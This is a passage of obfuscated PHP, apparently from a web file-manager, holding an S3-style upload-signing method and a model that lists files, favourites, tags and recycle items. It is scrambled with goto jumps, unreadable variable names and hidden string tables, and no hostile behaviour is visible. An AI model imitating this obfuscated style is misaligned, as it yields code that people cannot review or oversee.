__construct($dß¯‚´‚“Ã) { parent::__construct($dß¯‚´‚“Ã); $this->signatureVersion($_SERVER[—Ω][197]); } public function uploadFormData($bïû ‘∂¥é, $E÷å∫¡®úê = 3600) { goto fÙ¶∂∂€èè; fÒ≈‘∫œåê: $eô’ÿ§πå¥ = hash_hmac($E≈÷øã€Éã[1140], $açê…⁄ΩË“, $d∫Ñç¶¶Ò, !0); $f‹€Í≥Ö¬ä = hash_hmac($E≈÷øã€Éã[1140], $aÂ®ﬂº•·ä, $eô’ÿ§πå¥, !0); $bÇéáå†çÑ = hash_hmac($E≈÷øã€Éã[1140], $cßñÍ‚◊Ö⁄, $f‹€Í≥Ö¬ä); goto B∂ﬁÌ∫©¥Û; fÙ¶∂∂€èè: $E≈÷øã€Éã =& $_SERVER[—Ω]; $A“€ªº•¥ﬁ = $E≈÷øã€Éã[182]; $aı∆êç∆‘ñ = $E≈÷øã€Éã[1130]; goto D‚«∫±„â§; cëòÖ˘⁄”∏: $aÂ®ﬂº•·ä = $E≈÷øã€Éã[1132]; $A‹ıﬂÈ“è´ = $E÷å∫¡®úê . $E≈÷øã€Éã[33]; $AÉ«çÃ∫êó = $E≈÷øã€Éã[1097]; goto FáôµÏÔ“û; D‚«∫±„â§: $açê…⁄ΩË“ = $E≈÷øã€Éã[59]; $B‡¬∑πŒ≥§ = gmdate($E≈÷øã€Éã[1131]); $E“êı Æ”è = gmdate($E≈÷øã€Éã[700]); goto cëòÖ˘⁄”∏; FáôµÏÔ“û: $E‰‘±◊∫Ñª = array($this->accessKey, $E“êı Æ”è, $this->region, $açê…⁄ΩË“, $aÂ®ﬂº•·ä); $F±ï∆É»ı√ = implode($E≈÷øã€Éã[8], $E‰‘±◊∫Ñª); $fÉﬁüöºÈÒ = array($E≈÷øã€Éã[1099] => gmdate($E≈÷øã€Éã[1098], strtotime($E≈÷øã€Éã[1133])), $E≈÷øã€Éã[1100] => array(array($E≈÷øã€Éã[1102] => $this->bucket), array($E≈÷øã€Éã[1101] => $A“€ªº•¥ﬁ), array($E≈÷øã€Éã[1103], $E≈÷øã€Éã[1104], $E≈÷øã€Éã[33]), array($E≈÷øã€Éã[1103], $E≈÷øã€Éã[1134], $E≈÷øã€Éã[33]), array($E≈÷øã€Éã[1103], $E≈÷øã€Éã[1135], $E≈÷øã€Éã[33]), array($E≈÷øã€Éã[1105] => $AÉ«çÃ∫êó), array($E≈÷øã€Éã[1136] => $F±ï∆É»ı√), array($E≈÷øã€Éã[1137] => $aı∆êç∆‘ñ), array($E≈÷øã€Éã[1138] => $B‡¬∑πŒ≥§), array($E≈÷øã€Éã[1139] => $A‹ıﬂÈ“è´))); goto B≥ÏÚå∫îè; B∂ﬁÌ∫©¥Û: $a‘í£∂õ«Æ = array($E≈÷øã€Éã[196] => $E≈÷øã€Éã[33], $E≈÷øã€Éã[1142] => $E≈÷øã€Éã[33], $E≈÷øã€Éã[1101] => $A“€ªº•¥ﬁ, $E≈÷øã€Éã[1105] => $AÉ«çÃ∫êó, $E≈÷øã€Éã[1109] => $cßñÍ‚◊Ö⁄, $E≈÷øã€Éã[1143] => $F±ï∆É»ı√, $E≈÷øã€Éã[1144] => $aı∆êç∆‘ñ, $E≈÷øã€Éã[1145] => $B‡¬∑πŒ≥§, $E≈÷øã€Éã[1146] => $A‹ıﬂÈ“è´, $E≈÷øã€Éã[1147] => $bÇéáå†çÑ, $E≈÷øã€Éã[166] => $this->getHost()); return $a‘í£∂õ«Æ; goto E™—ÕÈÍä∏; B≥ÏÚå∫îè: $cßñÍ‚◊Ö⁄ = base64_encode(json_encode($fÉﬁüöºÈÒ)); $d±çœñëï∆ = hash_hmac($E≈÷øã€Éã[1140], $E“êı Æ”è, $E≈÷øã€Éã[1141] . $this->secret, !0); $d∫Ñç¶¶Ò = hash_hmac($E≈÷øã€Éã[1140], $this->region, $d±çœñëï∆, !0); goto fÒ≈‘∫œåê; E™—ÕÈÍä∏: } } goto eº±´öˆ∂ú; Fè›ÉÕÏÒÇ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\162\143\x65"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\x6d\x65" => "\x69\157\x5f\x73\x6f\165\x72\143\145\137\155\x65\x74\x61", "\x6d\x65\164\141\x46\x69\145\x6c\x64" => "\x73\157\165\x72\143\145\x49\104"); protected $dataAuto = array(array("\x6d\x6f\144\151\x66\x79\124\x69\155\x65", "\x74\151\x6d\x65", "\151\x6e\163\145\162\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\143\162\x65\x61\x74\145\x54\x69\x6d\145", "\x74\x69\x6d\145", "\151\156\x73\x65\x72\164", "\146\x75\156\x63\x74\151\157\x6e"), array("\166\x69\145\x77\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\x73\x65\x72\x74", "\146\165\156\x63\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Bæïà∞‰øÒ) { return $this->listSource(array($_SERVER[—Ω][365] => $Bæïà∞‰øÒ)); } public function typeName($Aé¿¡◊ºÓ¿) { static $Eã∫êœ∏“ä = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\x6d", self::TYPE_USER => "\165\x73\145\x72", self::TYPE_GROUP => "\x67\x72\x6f\x75\x70"); return $Eã∫êœ∏“ä[$Aé¿¡◊ºÓ¿ . $_SERVER[—Ω][33]]; } public function sourceListInfo($bÕ≤µÌ¶É, $b¿ô¥çêÙ´ = false) { goto E œ©Ωó∑ ; CçÎãñ€≠£: return array_to_keyvalue($Eë»®òûœø, $B´≠Ã≥î’å[366]); goto C∂·Ã†ôôÛ; E œ©Ωó∑ : $B´≠Ã≥î’å =& $_SERVER[—Ω]; $bÕ≤µÌ¶É = $bÕ≤µÌ¶É ? $bÕ≤µÌ¶É : array(); $bÕ≤µÌ¶É = array_filter(array_unique($bÕ≤µÌ¶É)); goto eﬁäÁ–Ûê—; eﬁäÁ–Ûê—: if (!$bÕ≤µÌ¶É) { return array(); } $Eë»®òûœø = $this->where(array($B´≠Ã≥î’å[366] => array($B´≠Ã≥î’å[7], $bÕ≤µÌ¶É)))->select(); $this->_listDataApply($Eë»®òûœø, $b¿ô¥çêÙ´); goto CçÎãñ€≠£; C∂·Ã†ôôÛ: } public function pathInfoFilter($f‹£⁄óì„á) { goto bƒèúºŒá∏; EÇä∂åë◊‹: $f‹£⁄óì„á[$E´≠Éã⁄é¬[368]] = $this->typeName($f‹£⁄óì„á[$E´≠Éã⁄é¬[368]]); if ($f‹£⁄óì„á[$E´≠Éã⁄é¬[367]] != 1) { $f‹£⁄óì„á[$E´≠Éã⁄é¬[157]] = $f‹£⁄óì„á[$E´≠Éã⁄é¬[369]]; unset($f‹£⁄óì„á[$E´≠Éã⁄é¬[369]]); } $FË©—ÔÍ≠Õ = $E´≠Éã⁄é¬[370]; goto eºíÈ≤„™ß; bƒèúºŒá∏: $E´≠Éã⁄é¬ =& $_SERVER[—Ω]; $f‹£⁄óì„á[$E´≠Éã⁄é¬[75]] = KodIO::make($f‹£⁄óì„á[$E´≠Éã⁄é¬[366]]); $f‹£⁄óì„á[$E´≠Éã⁄é¬[29]] = $f‹£⁄óì„á[$E´≠Éã⁄é¬[367]] == 1 ? $E´≠Éã⁄é¬[76] : $E´≠Éã⁄é¬[164]; goto EÇä∂åë◊‹; eºíÈ≤„™ß: $FË©—ÔÍ≠Õ .= $E´≠Éã⁄é¬[371]; $FË©—ÔÍ≠Õ .= $E´≠Éã⁄é¬[372]; $d…æÊ√˘§ù = explode($E´≠Éã⁄é¬[47], $FË©—ÔÍ≠Õ); goto Eú≠”Œ¯√∫; Eú≠”Œ¯√∫: if (isset($f‹£⁄óì„á[$E´≠Éã⁄é¬[373]]) && $f‹£⁄óì„á[$E´≠Éã⁄é¬[373]][$E´≠Éã⁄é¬[374]] == -1) { $d…æÊ√˘§ù = array_remove_value($d…æÊ√˘§ù, $E´≠Éã⁄é¬[184]); $d…æÊ√˘§ù = array_remove_value($d…æÊ√˘§ù, $E´≠Éã⁄é¬[107]); $d…æÊ√˘§ù = array_remove_value($d…æÊ√˘§ù, $E´≠Éã⁄é¬[375]); $d…æÊ√˘§ù = array_remove_value($d…æÊ√˘§ù, $E´≠Éã⁄é¬[376]); $d…æÊ√˘§ù = array_remove_value($d…æÊ√˘§ù, $E´≠Éã⁄é¬[77]); $d…æÊ√˘§ù = array_remove_value($d…æÊ√˘§ù, $E´≠Éã⁄é¬[377]); } $f‹£⁄óì„á = array_field_key($f‹£⁄óì„á, $d…æÊ√˘§ù); return $f‹£⁄óì„á; goto e∂Üêﬁñáé; e∂Üêﬁñáé: } public function listUserFav() { goto c˜∆€Œ⁄ò¥; düäÕ£“éÜ: foreach ($dÆèÕÂéœÆ as &$b§éÙ¬≠”Ú) { $b§éÙ¬≠”Ú = array($fçâπõãè∂[382] => $b§éÙ¬≠”Ú[$fçâπõãè∂[364]], $fçâπõãè∂[383] => $b§éÙ¬≠”Ú[$fçâπõãè∂[28]], $fçâπõãè∂[384] => $b§éÙ¬≠”Ú[$fçâπõãè∂[75]], $fçâπõãè∂[385] => $b§éÙ¬≠”Ú[$fçâπõãè∂[29]], $fçâπõãè∂[386] => $b§éÙ¬≠”Ú[$fçâπõãè∂[184]], $fçâπõãè∂[387] => $b§éÙ¬≠”Ú[$fçâπõãè∂[107]]); if ($b§éÙ¬≠”Ú[$fçâπõãè∂[29]] == $fçâπõãè∂[379] && $B›ÕÖäéè·[$b§éÙ¬≠”Ú[$fçâπõãè∂[75]]]) { $b§éÙ¬≠”Ú[$fçâπõãè∂[388]] = $B›ÕÖäéè·[$b§éÙ¬≠”Ú[$fçâπõãè∂[75]]]; } } return $dÆèÕÂéœÆ; goto F†≥á¥ÏØ¶; c˜∆€Œ⁄ò¥: $fçâπõãè∂ =& $_SERVER[—Ω]; $dÆèÕÂéœÆ = Model($fçâπõãè∂[378])->listData(); $f”ã·«ì”È = array_filter_by_field($dÆèÕÂéœÆ, $fçâπõãè∂[29], $fçâπõãè∂[379]); goto Dìè¢á«´Á; Dìè¢á«´Á: $f”ã·«ì”È = array_to_keyvalue($f”ã·«ì”È, $fçâπõãè∂[33], $fçâπõãè∂[75]); if ($f”ã·«ì”È) { $B›ÕÖäéè· = $this->listSource(array($fçâπõãè∂[380] => array($fçâπõãè∂[381], $f”ã·«ì”È))); } $B›ÕÖäéè· = array_to_keyvalue($B›ÕÖäéè·[$fçâπõãè∂[351]], $fçâπõãè∂[366]); goto düäÕ£“éÜ; F†≥á¥ÏØ¶: } public function listUserTag($F™Ûœá£“Ú) { goto Aë¿∑ùÍè≈; Aë¿∑ùÍè≈: $fÎáè≠ Œ´ =& $_SERVER[—Ω]; $Aû€£€ûÂù = Model($fÎáè≠ Œ´[389])->listData(); $dã≠úÍÚÒÎ = array_filter_by_field($Aû€£€ûÂù, $fÎáè≠ Œ´[390], $F™Ûœá£“Ú); goto aì≠ìΩéÂê; DÕí€ƒãÇê: return $this->listSource($eèÙÇ≥ Ÿü); goto aÆ±áÜ™‚£; aì≠ìΩéÂê: $dã≠úÍÚÒÎ = array_to_keyvalue($dã≠úÍÚÒÎ, $fÎáè≠ Œ´[33], $fÎáè≠ Œ´[75]); if (!$dã≠úÍÚÒÎ) { return array(); } $eèÙÇ≥ Ÿü = array($fÎáè≠ Œ´[380] => array($fÎáè≠ Œ´[381], $dã≠úÍÚÒÎ)); goto DÕí€ƒãÇê; aÆ±áÜ™‚£: } public function listUserRecycle() { $f¿ÙëıÊ⁄á =& $_SERVER[—Ω]; $Eùœâ›¶ìÿ = Model($f¿ÙëıÊ⁄á[391])->listData(); if (!$Eùœâ›¶ìÿ) { return array(); } $Aπ∞âëÜ’è = array($f¿ÙëıÊ⁄á[380] => array($f¿ÙëıÊ⁄á[381], $Eùœâ›¶ìÿ), $f¿ÙëıÊ⁄á[392] => 1); return $this->listSource($Aπ∞âëÜ’è); } public function listSource($Câƒ•Øßäÿ, $F™Ã…‡∑ÑÇ = 3000) { goto eì‹ã√Ç Á; eì‹ã√Ç Á: $a¥∏¢Îû†ä =& $_SERVER[—Ω]; if (!isset($Câƒ•Øßäÿ[$a¥∏¢Îû†ä[393]])) { $Câƒ•Øßäÿ[$a¥∏¢Îû†ä[393]] = 0; } $A‡ãü≈ªà» = $a¥∏¢Îû†ä[394]; goto b⁄¥Û–Ï¬ç; c∆√ÌÚÉïÒ: return $DÈÖƒêæœï; goto C÷Ô„¨Û€—; b⁄¥Û–Ï¬ç: $DÈÖƒêæœï = $this->field($A‡ãü≈ªà»)->_makeOrder()->where($Câƒ•Øßäÿ)->selectPage($F™Ã…‡∑ÑÇ); $this->_listDataApply($DÈÖƒêæœï[$a¥∏¢Îû†ä[351]]); $this->_listMake($DÈÖƒêæœï); goto c∆√ÌÚÉïÒ; C÷Ô„¨Û€—: } protected function _makeOrder() { goto EÓΩıë¡¯ë; D·»∞¨⁄å¥: $Cº¡”®ã∂– = Input::get($aˆîµÉ’å≤[404], $aˆîµÉ’å≤[7], $fÍ´ŸÊ…Ôî, array_keys($B∆Òº˜ƒõÖ)); if (!in_array($bÇñòé≥âÁ, array_keys($Dπíë£œı◊))) { $bÇñòé≥âÁ = $aˆîµÉ’å≤[28]; } if (!in_array($Cº¡”®ã∂–, array_keys($B∆Òº˜ƒõÖ))) { $bÇñòé≥âÁ = $aˆîµÉ’å≤[398]; } goto eó≈Ô÷ª¯Ñ; EÓΩıë¡¯ë: $aˆîµÉ’å≤ =& $_SERVER[—Ω]; $A≠≤‰Ñ®ìü = Model($aˆîµÉ’å≤[395])->get($aˆîµÉ’å≤[396]); $fÍ´ŸÊ…Ôî = Model($aˆîµÉ’å≤[395])->get($aˆîµÉ’å≤[397]); goto EÂù§ÑÍ—ä; EÂù§ÑÍ—ä: $B∆Òº˜ƒõÖ = array($aˆîµÉ’å≤[398] => $aˆîµÉ’å≤[399], $aˆîµÉ’å≤[400] => $aˆîµÉ’å≤[401]); $Dπíë£œı◊ = array($aˆîµÉ’å≤[28] => $aˆîµÉ’å≤[28], $aˆîµÉ’å≤[77] => $aˆîµÉ’å≤[77], $aˆîµÉ’å≤[157] => $aˆîµÉ’å≤[369], $aˆîµÉ’å≤[375] => $aˆîµÉ’å≤[375], $aˆîµÉ’å≤[402] => $aˆîµÉ’å≤[376], $aˆîµÉ’å≤[184] => $aˆîµÉ’å≤[184], $aˆîµÉ’å≤[107] => $aˆîµÉ’å≤[107]); $bÇñòé≥âÁ = Input::get($aˆîµÉ’å≤[403], $aˆîµÉ’å≤[7], $A≠≤‰Ñ®ìü, array_keys($Dπíë£œı◊)); goto D·»∞¨⁄å¥; eó≈Ô÷ª¯Ñ: if ($bÇñòé≥âÁ == $aˆîµÉ’å≤[28]) { } $bå´¶ƒ≥õ = $aˆîµÉ’å≤[405] . $Dπíë£œı◊[$bÇñòé≥âÁ] . $aˆîµÉ’å≤[50] . $B∆Òº˜ƒõÖ[$Cº¡”®ã∂–]; return $this->order(rtrim(trim($bå´¶ƒ≥õ), $aˆîµÉ’å≤[47])); goto C¿Ñ⁄“ìÙ÷; C¿Ñ⁄“ìÙ÷: } protected function _listDataApplyItem($D≤†Æ≈¡»ª, $c“ﬁàÔÃ∂∂ = false) { $aâé∆¶äÇ = array($D≤†Æ≈¡»ª); $this->_listDataApply($aâé∆¶äÇ, $c“ﬁàÔÃ∂∂); return $aâé∆¶äÇ[0]; } protected function _listDataApply(&$EÊÈƒ√¿ÔÉ, $BÀ€áñä±¶ = false) { goto C∞¡ÌÎª¥ã; EÈÜ˜≥¿›°: $this->_listAppendPath($EÊÈƒ√¿ÔÉ); $this->_listAppendAuth($EÊÈƒ√¿ÔÉ); $this->_listAppendSourceInfo($EÊÈƒ√¿ÔÉ, $C´Ê•ù≥¿ó); goto aÖø≤ÆﬁÜó; aÖø≤ÆﬁÜó: $this->_listAppendUser($EÊÈƒ√¿ÔÉ); $this->_listFilterInfo($EÊÈƒ√¿ÔÉ, $BÀ€áñä±¶); goto CﬂÑöŒñÉ; Dõ„óπØŒ…: $C´Ê•ù≥¿ó = array_unique($C´Ê•ù≥¿ó); $this->_listSourceCache($EÊÈƒ√¿ÔÉ); if (!$BÀ€áñä±¶) { $this->_listAppendMeta($EÊÈƒ√¿ÔÉ, $C´Ê•ù≥¿ó); $this->_listAppendFileMeta($EÊÈƒ√¿ÔÉ, $C´Ê•ù≥¿ó); $this->_listAppendChildren($EÊÈƒ√¿ÔÉ, $C´Ê•ù≥¿ó); } goto EÈÜ˜≥¿›°; C∞¡ÌÎª¥ã: $eÃ£çûıë´ =& $_SERVER[—Ω]; if (!$EÊÈƒ√¿ÔÉ) { $EÊÈƒ√¿ÔÉ = array(); return; } $C´Ê•ù≥¿ó = array_to_keyvalue($EÊÈƒ√¿ÔÉ, $eÃ£çûıë´[33], $eÃ£çûıë´[366]); goto Dõ„óπØŒ…; CﬂÑöŒñÉ: } protected function _listSourceCache($a‘¨æΩ∏ëÖ) { $B“ºÍöΩÃÆ =& $_SERVER[—Ω]; foreach ($a‘¨æΩ∏ëÖ as $fåãâÃê∞Æ) { self::$cacheSourceInfo[$B“ºÍöΩÃÆ[406] . $fåãâÃê∞Æ[$B“ºÍöΩÃÆ[366]]] = $fåãâÃê∞Æ; } } protected function _listFilterInfo(&$e·ü≥÷ÂÉû, $bçÑ“Êºûµ = false) { $a∆ª≠ºÇ“û =& $_SERVER[—Ω]; foreach ($e·ü≥÷ÂÉû as &$BΩ∞à®â†ï) { $BΩ∞à®â†ï = $this->pathInfoFilter($BΩ∞à®â†ï); self::$cachePathInfo[$a∆ª≠ºÇ“û[407] . intval($bçÑ“Êºûµ) . $a∆ª≠ºÇ“û[408] . $BΩ∞à®â†ï[$a∆ª≠ºÇ“û[366]]] = $BΩ∞à®â†ï; } } protected function _listMake(&$FÚ›ıƒ…“Ñ) { $DôÔ’£Ñßø =& $_SERVER[—Ω]; $FÚ›ıƒ…“Ñ[$DôÔ’£Ñßø[74]] = array(); $FÚ›ıƒ…“Ñ[$DôÔ’£Ñßø[73]] = array(); foreach ($FÚ›ıƒ…“Ñ[$DôÔ’£Ñßø[351]] as $föà§ïåÍß) { $fëˆäÿ´Àû = $föà§ïåÍß[$DôÔ’£Ñßø[367]] == 1 ? $DôÔ’£Ñßø[74] : $DôÔ’£Ñßø[73]; $FÚ›ıƒ…“Ñ[$fëˆäÿ´Àû][] = $föà§ïåÍß; } unset($FÚ›ıƒ…“Ñ[$DôÔ’£Ñßø[351]]); } protected function _listAppendMeta(&$cÏ‡âº«‘ø, $aàïŸÔì’ç) { goto FÍçãÜÌÜµ; FÍçãÜÌÜµ: $B‡œ¡Æìê‘ =& $_SERVER[—Ω]; $Fì€ääàÒ« = array($B‡œ¡Æìê‘[380] => array($B‡œ¡Æìê‘[381], $aàïŸÔì’ç)); $EƒﬁªòÉÀ = Model($B‡œ¡Æìê‘[409])->field($B‡œ¡Æìê‘[410])->where($Fì€ääàÒ«)->select(); goto aÀ€⁄˘êπö; aÀ€⁄˘êπö: if (!$EƒﬁªòÉÀ) { return; } $Dèßé—ÊØ« = array($B‡œ¡Æìê‘[411], $B‡œ¡Æìê‘[412]); $FµÑœÚÏ¥ê = array(); goto FîßÎ¶›€◊; FîßÎ¶›€◊: foreach ($EƒﬁªòÉÀ as $A⁄†”ˆóÿú) { if (!isset($FµÑœÚÏ¥ê[$A⁄†”ˆóÿú[$B‡œ¡Æìê‘[366]]])) { $FµÑœÚÏ¥ê[$A⁄†”ˆóÿú[$B‡œ¡Æìê‘[366]]] = array(); } if (in_array($A⁄†”ˆóÿú[$B‡œ¡Æìê‘[89]], $Dèßé—ÊØ«)) { continue; } $FµÑœÚÏ¥ê[$A⁄†”ˆóÿú[$B‡œ¡Æìê‘[366]]][$A⁄†”ˆóÿú[$B‡œ¡Æìê‘[89]]] = $A⁄†”ˆóÿú[$B‡œ¡Æìê‘[356]]; } foreach ($cÏ‡âº«‘ø as &$a∂ëóƒãËÙ) { $a∂ëóƒãËÙ[$B‡œ¡Æìê‘[413]] = !1; if (isset($FµÑœÚÏ¥ê[$a∂ëóƒãËÙ[$B‡œ¡Æìê‘[366]]])) { $a∂ëóƒãËÙ[$B‡œ¡Æìê‘[413]] = $FµÑœÚÏ¥ê[$a∂ëóƒãËÙ[$B‡œ¡Æìê‘[366]]]; } if ($this->fileIsLock($a∂ëóƒãËÙ) && $a∂ëóƒãËÙ[$B‡œ¡Æìê‘[373]]) { $d≈Õö¡€ª€ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $a∂ëóƒãËÙ[$B‡œ¡Æìê‘[373]][$B‡œ¡Æìê‘[374]] = AuthModel::authDisable($a∂ëóƒãËÙ[$B‡œ¡Æìê‘[373]][$B‡œ¡Æìê‘[374]], $d≈Õö¡€ª€); $a∂ëóƒãËÙ[$B‡œ¡Æìê‘[373]][$B‡œ¡Æìê‘[414]][$B‡œ¡Æìê‘[373]] = $a∂ëóƒãËÙ[$B‡œ¡Æìê‘[373]][$B‡œ¡Æìê‘[374]]; } } goto D¡ä¬ÖæπØ; D¡ä¬ÖæπØ: } protected function _listAppendFileMeta(&$eï˘Ÿ‹âêÿ, $C•Ç◊ê¬€®) { goto A¥’¿éÛñ∫; Aùÿ•Æêâÿ: foreach ($eï˘Ÿ‹âêÿ as &$E≥≤æ…µøê) { goto b∑«çäûé±; B›ôÁÖÑøÜ: $CãÑèõ«´⁄[$B≤∏É⁄™√É[77]] = $E≥≤æ…µøê[$B≤∏É⁄™√É[77]]; $CãÑèõ«´⁄[$B≤∏É⁄™√É[28]] = $E≥≤æ…µøê[$B≤∏É⁄™√É[28]]; self::$cacheFileInfo[$B≤∏É⁄™√É[421] . $Fø°ç‘ÒÇÌ] = $CãÑèõ«´⁄; goto bÜÂ©ﬁ“Ô∑; b∑«çäûé±: $Fø°ç‘ÒÇÌ = $E≥≤æ…µøê[$B≤∏É⁄™√É[415]]; if (!$Fø°ç‘ÒÇÌ || !isset($Aÿ©ä∏≠Ù˘[$Fø°ç‘ÒÇÌ])) { continue; } $CãÑèõ«´⁄ = $Aÿ©ä∏≠Ù˘[$Fø°ç‘ÒÇÌ]; goto B›ôÁÖÑøÜ; bÜÂ©ﬁ“Ô∑: unset($Aÿ©ä∏≠Ù˘[$Fø°ç‘ÒÇÌ][$B≤∏É⁄™√É[75]]); $a¡®¬æßæü = is_array($dÔ’ÕÇûÑ•[$Fø°ç‘ÒÇÌ]) ? $dÔ’ÕÇûÑ•[$Fø°ç‘ÒÇÌ] : array(); $E≥≤æ…µøê[$B≤∏É⁄™√É[159]] = array_merge($a¡®¬æßæü, $Aÿ©ä∏≠Ù˘[$Fø°ç‘ÒÇÌ]); goto b∞ßæè¯ïå; b∞ßæè¯ïå: if (isset($E≥≤æ…µøê[$B≤∏É⁄™√É[159]][$B≤∏É⁄™√É[422]])) { $E≥≤æ…µøê[$B≤∏É⁄™√É[422]] = json_decode($E≥≤æ…µøê[$B≤∏É⁄™√É[159]][$B≤∏É⁄™√É[422]], !0); unset($E≥≤æ…µøê[$B≤∏É⁄™√É[159]][$B≤∏É⁄™√É[422]]); } goto e®ı”ﬁÌ†Ù; e®ı”ﬁÌ†Ù: } goto FÏ “ÖÁà∫; C∏àî¿ƒì‰: $Aÿ©ä∏≠Ù˘ = Model($B≤∏É⁄™√É[418])->field($C€“ø¢©å´)->where($eØÈù¯°‘Œ)->select(); $Aÿ©ä∏≠Ù˘ = array_to_keyvalue($Aÿ©ä∏≠Ù˘, $B≤∏É⁄™√É[415]); $E’ì·ë≈ª‰ = Model($B≤∏É⁄™√É[419])->field($B≤∏É⁄™√É[420])->where($eØÈù¯°‘Œ)->select(); goto A”·¬í¡£ë; A”·¬í¡£ë: $E’ì·ë≈ª‰ = $E’ì·ë≈ª‰ ? $E’ì·ë≈ª‰ : array(); $dÔ’ÕÇûÑ• = array(); foreach ($E’ì·ë≈ª‰ as $c±ÑÓÖ◊í¶) { if (!isset($dÔ’ÕÇûÑ•[$c±ÑÓÖ◊í¶[$B≤∏É⁄™√É[415]]])) { $dÔ’ÕÇûÑ•[$c±ÑÓÖ◊í¶[$B≤∏É⁄™√É[415]]] = array(); } $dÔ’ÕÇûÑ•[$c±ÑÓÖ◊í¶[$B≤∏É⁄™√É[415]]][$c±ÑÓÖ◊í¶[$B≤∏É⁄™√É[89]]] = $c±ÑÓÖ◊í¶[$B≤∏É⁄™√É[356]]; } goto Aùÿ•Æêâÿ; aÙçù–˘Ì∑: if (!$b√ÑËŸã©Ò) { return; } $eØÈù¯°‘Œ = array($B≤∏É⁄™√É[416] => array($B≤∏É⁄™√É[381], $b√ÑËŸã©Ò)); $C€“ø¢©å´ = $B≤∏É⁄™√É[417]; goto C∏àî¿ƒì‰; A¥’¿éÛñ∫: $B≤∏É⁄™√É =& $_SERVER[—Ω]; $b√ÑËŸã©Ò = array_to_keyvalue($eï˘Ÿ‹âêÿ, $B≤∏É⁄™√É[33], $B≤∏É⁄™√É[415]); $b√ÑËŸã©Ò = array_filter(array_unique($b√ÑËŸã©Ò)); goto aÙçù–˘Ì∑; FÏ “ÖÁà∫: } protected function _listAppendSourceInfo(&$E“œá≠ŸÉÚ, $E“É€¶¯∂‡) { goto BŸ˘∫ÕˆŸ∑; Dø◊Ê“‘è§: $d®¥’∞Ç í = Model($F∆¯Ò¨…Â“[389])->listData(); $Dá±‘ãœﬁÀ = Model($F∆¯Ò¨…Â“[378])->listData(); $aÚïà√ƒª• = Model($F∆¯Ò¨…Â“[425])->listSimple(); goto B∑˜˜â€Áé; C¬ê¥ÍƒªÌ: $Fã’ÇΩÎﬂπ = array_to_keyvalue_group($aÚïà√ƒª•, $F∆¯Ò¨…Â“[366]); foreach ($E“œá≠ŸÉÚ as &$B©Ì∞π÷°∑) { $B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[388]] = array($F∆¯Ò¨…Â“[426] => 0, $F∆¯Ò¨…Â“[427] => 0, $F∆¯Ò¨…Â“[428] => 0); if (isset($FîâÉ∞åï‹[$B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[366]]])) { $B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[388]][$F∆¯Ò¨…Â“[429]] = 1; $B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[388]][$F∆¯Ò¨…Â“[430]] = $FîâÉ∞åï‹[$B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[366]]][$F∆¯Ò¨…Â“[28]]; } if (isset($f®°¡ŸÃà„[$B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[366]]])) { $B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[388]][$F∆¯Ò¨…Â“[431]] = array(); foreach ($f®°¡ŸÃà„[$B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[366]]] as $aÚÕÔÏú›Ø) { $Füã‡©å≈Ÿ = $aòÍ›úÎ•ò[$aÚÕÔÏú›Ø]; $B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[388]][$F∆¯Ò¨…Â“[431]][] = array($F∆¯Ò¨…Â“[432] => $Füã‡©å≈Ÿ[$F∆¯Ò¨…Â“[364]], $F∆¯Ò¨…Â“[383] => $Füã‡©å≈Ÿ[$F∆¯Ò¨…Â“[28]], $F∆¯Ò¨…Â“[433] => $Füã‡©å≈Ÿ[$F∆¯Ò¨…Â“[434]]); } } if (isset($Fã’ÇΩÎﬂπ[$B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[366]]])) { $B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[388]][$F∆¯Ò¨…Â“[435]] = array(); foreach ($Fã’ÇΩÎﬂπ[$B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[366]]] as $d√‡ÎéôÚÌ) { $B©Ì∞π÷°∑[$F∆¯Ò¨…Â“[388]][$F∆¯Ò¨…Â“[435]] = array($F∆¯Ò¨…Â“[436] => $d√‡ÎéôÚÌ[$F∆¯Ò¨…Â“[437]], $F∆¯Ò¨…Â“[438] => $d√‡ÎéôÚÌ[$F∆¯Ò¨…Â“[439]], $F∆¯Ò¨…Â“[440] => $d√‡ÎéôÚÌ[$F∆¯Ò¨…Â“[366]], $F∆¯Ò¨…Â“[441] => $d√‡ÎéôÚÌ[$F∆¯Ò¨…Â“[442]], $F∆¯Ò¨…Â“[443] => $d√‡ÎéôÚÌ[$F∆¯Ò¨…Â“[444]]); } } } return $E“œá≠ŸÉÚ; goto f‰ã•ê’ª•; B∑˜˜â€Áé: $aòÍ›úÎ•ò = array_to_keyvalue($BòÜ”ÁêëÉ, $F∆¯Ò¨…Â“[364]); $f®°¡ŸÃà„ = array_to_keyvalue_group($d®¥’∞Ç í, $F∆¯Ò¨…Â“[75], $F∆¯Ò¨…Â“[390]); $FîâÉ∞åï‹ = array_to_keyvalue($Dá±‘ãœﬁÀ, $F∆¯Ò¨…Â“[75]); goto C¬ê¥ÍƒªÌ; BŸ˘∫ÕˆŸ∑: $F∆¯Ò¨…Â“ =& $_SERVER[—Ω]; if (!defined($F∆¯Ò¨…Â“[423])) { return; } $BòÜ”ÁêëÉ = Model($F∆¯Ò¨…Â“[424])->listData(); goto Dø◊Ê“‘è§; f‰ã•ê’ª•: } protected function _listAppendChildren(&$d¿ãøù¬ıÒ, $C´’éÑ·Ë∆) { goto C¯Ë∞Ùï˜™; C¯Ë∞Ùï˜™: $Dﬁ€«ÈÔ∏› =& $_SERVER[—Ω]; $fÖã °”ßô = $Dﬁ€«ÈÔ∏›[358]; $aÀΩßñÈ·º = array(); goto 